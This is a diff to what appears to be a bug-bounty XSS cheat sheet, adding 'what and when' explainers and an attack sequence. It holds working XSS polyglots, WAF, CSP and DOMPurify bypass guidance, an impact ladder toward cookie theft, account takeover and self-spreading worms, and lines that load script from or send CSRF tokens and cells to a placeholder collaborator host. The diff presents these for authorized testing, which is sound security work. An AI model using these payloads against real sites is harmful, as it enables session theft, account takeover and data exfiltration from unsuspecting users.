@@ -6,6 +6,41 @@
 
 ---
 
+## §0.0 — The whole attack in one sequence
+
+*What & when:* the entire XSS run on one screen — the **decision spine** every section below plugs into. §0 (next) routes you from *what came back* to the right **payload** section; **this** spine routes you from a payload to the **bounty**. XSS's rule: execution is the door, **impact is the finding** — never stop at `alert(1)`. Follow the arrows to the matching section here or the guide §.
+
+```
+# ── 1. RECON: enumerate every SOURCE (guide §1, §3) ──────────────────────
+query · path · POST · JSON · headers(Referer/UA) · cookies · #fragment(DOM) · window.name · postMessage · stored fields · uploads(SVG/HTML)
+   → fingerprint: framework(React/Vue/Angular) · CSP · WAF · cookie flags(HttpOnly/SameSite)
+
+# ── 2. DETECT + NAME THE CONTEXT  ★ never skip (§A polyglot, §0 router) ───
+inject  xss7f3a9'"<>`   → find marker in RAW response AND live DOM → which chars came back UNENCODED?
+   → NAME it: HTML body · quoted/unquoted attr · JS string · on*-handler · URL(href/src) · CSS · DOM sink   (→ §0 map → §B–§F payload)
+
+# ── 3. EXECUTE with the MINIMAL context-correct breakout (§B–§F) ─────────
+HTML: <svg onload=…>   attr: "><svg onload=…> / " autofocus onfocus=…   JS-string: ";alert(document.domain)//
+URL: javascript:alert()   DOM: trace source→sink (DOM Invader)   stored/blind: plant + XSS-Hunter (§13)
+   → CONFIRM exec = alert(document.domain)  OR  OOB collaborator hit   (proves origin, kills FP)
+
+# ── 4. BYPASS the defense that's in the way (§G WAF · §H CSP · §I length) ─
+WAF: case/encode/split/#fragment   CSP: JSONP/script-gadget/<base>/nonce-reuse/dangling-markup   sanitizer/mXSS: match DOMPurify version
+   Trusted Types enforced? → default-policy / non-TT sink (location=javascript:)
+
+# ── 5. IMPACT LADDER ⭐ the money — climb as far as the app allows (§J, guide §23) ─
+no HttpOnly → cookie theft → ATO   |   token in localStorage → steal JWT → API as victim
+HttpOnly cookie → read CSRF token → force email/pw change → password reset → ATO   ← the HttpOnly-PROOF chain
+admin/support renders your stored payload (blind) → promote your account / read PII → priv-esc   |   stored → self-propagating WORM
+
+# ── 6. PROVE benign, then STOP (guide §38) ───────────────────────────────
+own 2 accounts (attacker+victim) · alert(document.domain) or OWN OOB · one impact proof · tear down PoC page · restore changed data
+```
+
+> **Cash-out map (guide §23 ladder / §36 severity):** reflected+no-HttpOnly → **cookie theft→ATO** (High/Crit) · **HttpOnly-proof**: read CSRF token → email-change → reset → **ATO** (Critical) · localStorage JWT → **API-as-victim** (High/Crit) · **stored in admin/support view** → **admin priv-esc / mass-ATO** (Critical) · stored self-spreading → **worm** (§42 Samy/TweetDeck) · lone `alert(1)` with no stolen asset & strict unbypassable CSP = **de-prioritise** (guide §35). Full worked run with the bytes: **guide Appendix D**.
+
+---
+
 ## 0. Decision map — read what came back, then jump to the right section (the "if this → do this")
 
 > Inject the probe **`xss7f3a9'"<>`** , find your marker in the **raw response AND the live DOM**, read the bytes around
@@ -44,6 +79,7 @@ RULE: each char has its own fate — "`<` encoded but `"` raw" is the classic wi
 ---
 
 ## A. Discovery polyglots (fire first, see what survives)
+> **What & when:** fire one of these *first*, before you know the context — a polyglot is a single string built to break out of *many* spots at once, so you quickly see which characters the app lets through. Read what came back, then switch to the *minimal* context-correct payload from the right section below. Don't submit a polyglot as your PoC; use it to find the context, then aim.
 
 ```
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
@@ -58,6 +94,7 @@ javascript:"/*'/*`/*--></noscript></title></style></textarea></script><html \" o
 ---
 
 ## B. HTML body context (guide §6)
+> **What & when:** use when your marker landed in plain page text (`<p>HERE</p>`) and `<`/`>` came back raw — you can start a fresh tag. In *server-reflected* body HTML a plain `<script>` runs fine; but prefer `<svg onload=…>`/`<img src=x onerror=…>` because they slip more filters **and** still fire when the value is written later via `innerHTML` (where injected `<script>` tags do *not* execute). This is the easiest context; if `<` came back encoded, you're not here — pivot.
 
 ```html
 <script>alert(document.domain)</script>
@@ -85,6 +122,7 @@ javascript:"/*'/*`/*--></noscript></title></style></textarea></script><html \" o
 ---
 
 ## C. HTML attribute context (guide §7)
+> **What & when:** use when your marker sits inside a tag's attribute (`value="HERE"`). First job is to escape the quote (`"><svg…>`); if `>` is blocked but `"` is raw, *stay inside the tag* and add your own event handler (`" autofocus onfocus=…`). If you're inside an `on…=` handler already, you're in JavaScript — HTML-entities decode there, so `');alert(1)//` works.
 
 ```html
 <!-- Quoted: break out -->
@@ -113,6 +151,7 @@ x onfocus=alert(1) autofocus
 ---
 
 ## D. JavaScript context (guide §8)
+> **What & when:** use when your marker is already *inside* a `<script>` block (`var x="HERE"`). You're in JavaScript, so **you don't need `<` or a tag at all** — just break the string/statement (`";alert(1)//`). If the app escaped your quote to `\"`, inject a backslash to neutralize its escape (`\";alert(1)//`). This is the context beginners miss because `<script>…</script>` is inert here.
 
 ```javascript
 // Inside double-quoted string:  var x = "HERE";
@@ -178,6 +217,7 @@ input[name="csrf"][value^="b"]{background:url(//YOUR.oast.fun/leak?c=b)}
 ---
 
 ## G. WAF / filter bypass (guide §18)
+> **What & when:** reach for these when your marker clearly reflects but the obvious payload gets stripped or 403'd — the block is a filter, not a wall. Route around the *specific* thing it blocks: mixed case, split/nested keywords (`<scr<script>ipt>`), alternate tags/events, no-space forms (`<svg/onload=…>`), or encoding. Confirm what's actually filtered one character at a time (§0) so you're bypassing the real block, not guessing.
 
 ```html
 <!-- Case & structure -->
@@ -227,6 +267,7 @@ Strategy reminders (guide §18.3):
 ---
 
 ## H. CSP bypass (guide §19)
+> **What & when:** use when your injection works but the actor *refuses to perform it* because a Content-Security-Policy blocks inline/foreign scripts. Find the hole: a JSONP endpoint on an allow-listed host, a script gadget in a trusted framework, a missing `base-uri`/`object-src`, or a reused/reflected nonce. If scripts are truly blocked, fall back to no-JS (dangling-markup/CSS) exfil (§I/§F).
 
 ```html
 <!-- unsafe-inline present → inline just runs -->
@@ -345,6 +386,7 @@ CSV/formula injection:   =HYPERLINK("//YOUR.oast.fun/?c="&A1,"click")   ;  =cmd|
 ---
 
 ## M. Impact one-liners (escalation — guide Part IV; full scripts in `poc/`)
+> **What & when:** the moment `alert(1)` fires, come here — these turn "the actor performed my line" into the actual finding: read the login wristband (if not HttpOnly), lift a token, or fire an action in the victim's session. Use benign markers, exfil only your *own* test account's data, and lead your report with whichever of these you proved.
 
 ```javascript
 // Cookie theft (no HttpOnly) — guide §24
@@ -366,6 +408,8 @@ var s=document.createElement('script');s.src='//YOUR.oast.fun/h.js';document.bod
 ---
 
 ## N. Sanitizer / DOMPurify / mutation-XSS (mXSS) bypass — HIGH value (guide §15/§17)
+
+> **What & when:** high-value, for mature apps that pass user HTML through a sanitizer (DOMPurify). mXSS is the twist: the sanitizer looks at your markup, decides it's *safe*, lets it through — and then the browser *re-parses* it and it silently mutates into an executable script. These defeat the exact defense serious targets rely on, so they pay well; match the payload to the sanitizer's version.
 
 > When output is run through an HTML sanitizer (DOMPurify, sanitize-html, OWASP Java HTML Sanitizer, Ruby Loofah,
 > Bleach) the bug is a **parser-roundtrip mismatch**: the sanitizer's parse ≠ the browser's re-parse, so markup
